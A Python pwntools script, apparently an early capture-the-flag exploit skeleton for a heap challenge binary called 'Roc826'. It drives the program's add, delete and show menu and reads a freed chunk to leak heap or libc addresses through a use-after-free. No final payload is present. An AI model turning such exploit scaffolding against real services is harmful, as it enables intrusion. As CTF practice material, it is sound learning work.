#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './Roc826'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = './libc-2.23.so'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def add(size,cont):
    sla(':','1')
    sla('size?\n',str(size))
    sla('content:',cont)

def delete(index):
    sla(':','2')
    sla('index?\n',str(index))

def show(index):
    sla(':','3')
    sla('index?\n',str(index))
    ru('content:')
    return ru('-----------------')

# info
# gadget
# elf, libc
add(24,"AAAA")
add(24,"BBBB")
log.hexdump( show(1) )
delete(1)
delete(0)
log.hexdump( show(1) )

p.interactive()

